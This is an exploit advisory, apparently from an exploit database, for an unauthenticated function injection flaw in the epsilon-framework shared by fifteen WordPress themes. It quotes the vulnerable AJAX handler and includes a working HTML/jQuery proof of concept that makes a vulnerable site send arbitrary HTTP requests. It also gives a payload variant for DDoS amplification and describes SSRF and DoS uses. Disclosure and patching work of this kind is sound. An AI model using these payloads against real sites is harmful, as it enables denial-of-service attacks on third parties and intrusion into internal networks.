@@ -1,0 +1,161 @@
+# Exploit Title: Wordpress Epsilon Framework Multiple Themes - Unauthenticated Function Injection
+# Date: 22/12/2020
+# Exploit Authors: gx1 <g.per45[at]gmail.com> lotar <Giuseppe.DiTerlizzi[at]nttdata.com>
+# Vendor Homepage: https://wordpress.com/
+# Software Link:   https://github.com/WordPress/WordPress
+# Affected Themes: 
+
+	shapely        -	 Fixed in version 1.2.9
+	newsmag        -	 Fixed in version 2.4.2
+	activello      - 	 Fixed in version 1.4.2
+	illdy          -	 Fixed in version 2.1.7
+	allegiant      - 	 Fixed in version 1.2.6
+	newspaper-x    - 	 Fixed in version 1.3.2
+	pixova-lite    - 	 Fixed in version 2.0.7
+	brilliance     - 	 Fixed in version 1.3.0
+	medzone-lite   - 	 Fixed in version 1.2.6
+	regina-lite    - 	 Fixed in version 2.0.6
+	transcend      - 	 Fixed in version 1.2.0
+	affluent       - 	 Fixed in version 1.1.2
+	bonkers        - 	 Fixed in version 1.0.6
+	antreas        - 	 Fixed in version 1.0.7
+	naturemag-lite - 	 No known fix
+	
+# Tested on: Wordpress 5.6
+# CVE :  N/A
+
+# References: 
+
+- https://wpscan.com/vulnerability/10417
+- https://blog.nintechnet.com/unauthenticated-function-injection-vulnerability-fixed-in-15-wordpress-themes/
+- https://www.wordfence.com/blog/2020/11/large-scale-attacks-target-epsilon-framework-themes/
+- https://developer.wordpress.org/reference/classes/requests/request_multiple/
+
+Description: 
+
+Fifteen WordPress themes use a vulnerable version of epsilon-framework that vulnerable to a critical unauthenticated function injection vulnerability, due to the lack of capability and CSRF nonce checks in AJAX actions.
+
+Technical Details: 
+
+The vulnerability is present in epsilon_framework_ajax_action AJAX action that is accessible to all users, authenticated or not. 
+The function takes three POST user input, assign them to the $class, $method and $args variables and calls the class with arguments: 
+
+================================================================
+
+  public function epsilon_framework_ajax_action() {
+      if ( 'epsilon_framework_ajax_action' !== $_POST['action'] ) {
+         wp_die(
+            json_encode(
+               array(
+                  'status' => false,
+                  'error'  => 'Not allowed',
+               )
+            )
+         );
+      }
+   
+      if ( count( $_POST['args']['action'] ) !== 2 ) {
+         wp_die(
+            json_encode(
+               array(
+                  'status' => false,
+                  'error'  => 'Not allowed',
+               )
+            )
+         );
+      }
+   
+      if ( ! class_exists( $_POST['args']['action'][0] ) ) {
+         wp_die(
+            json_encode(
+               array(
+                  'status' => false,
+                  'error'  => 'Class does not exist',
+               )
+            )
+         );
+      }
+   
+      $class  = $_POST['args']['action'][0];
+      $method = $_POST['args']['action'][1];
+      $args   = $_POST['args']['args'];
+   
+      $response = $class::$method( $args );
+================================================================  
+	
+Nonce is checked only if it set.
+As it is possible to observe, the vulnerability can be exploited if the attacker is able to use a class that contains a public static method that accept an array argument. 
+Useful methods should be investigated in the context of the targeted website, because they could depend by the installed plugins and themes. 
+On a wordpress instance, it is possible to store the list of classes containing public static methods by adding this code in epsilon_framework_ajax_action function: 
+
+================================================================
+function testClasses() {
+       error_log("[+] IN TEST CLASSES");
+       mkdir("/tmp/classes");
+       foreach(get_declared_classes() as $c) { 
+         mylog($c);
+         $f = fopen('/tmp/classes/'.$c, 'w');
+         $reflection = new ReflectionClass($c);
+         $staticMethods = $reflection->getMethods(ReflectionMethod::IS_STATIC); 
+         foreach($staticMethods as $sm) {
+           mylog($sm);
+           fwrite($f, $sm . "\n");
+         }
+         fclose($f);
+       }   
+     }   
+     testClasses();
+===============================================================
+
+We have found Requests::request_multiple static method(array $requests) in the core of Wordpress that can be used to send arbitrary HTTP requests, with critical dangerous effects for the vulnerable target. 
+
+Proof Of Concept: 
+
+The following code: 
+
+===============================================================
+<html>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+<script>
+$(document).ready(function(){
+	console.log("document ready");
+	var ajax_url = "<vulnerable-wordpress-ip>/wp-admin/admin-ajax.php"
+	var data = {
+		'action':  'epsilon_framework_ajax_action',
+		'args': {
+			'action': ["Requests", "request_multiple"],
+			'args' : [{"url": "<poc-website>"}]
+		}
+	}
+	$.post(ajax_url, data, function(response) {
+		console.log("in response")
+	});
+});
+</script>
+</html> 
+===============================================================
+
+sends a request to <poc-request>: 
+
+==============================================================================================================================
+<vulnerable-wordpress-ip>- - [22/Dec/2020:18:36:51 +0000] "GET / HTTP/1.1" 200 3898 "<poc-website>" "php-requests/1.7-3470169"
+==============================================================================================================================
+
+
+Impacts:
+
+1. DDOS amplification against a target: the attacker can exploit vulnerable wordpress sites to send ajax requests with args array containing multiple occurrences of the target. In this way, he can perform an amplification attack against a target website. 
+ 	var data = {
+		'action':  'epsilon_framework_ajax_action',
+
+		'args': {
+			'action': ["Requests", "request_multiple"],
+			'args' : [{"url": "<target>"}, {"url": "<target>"}, {"url": "<target>"}, ...]
+		}
+	}
+	
+2. SSRF: the attacker can exploit Requests::request_multiple method to perform a Server-Side Request Forgery and obtain access to internal network through vulnerable Wordpress site.
+3. Wordpress DoS: if the attacker creates a specific POST request that contains a request to "/wp-admin/admin-ajax.php" as data he could be able to create an internal loop that crashes Wordpress site. 
+
+Solution: 
+In Affected Themes we show the fixed versions.
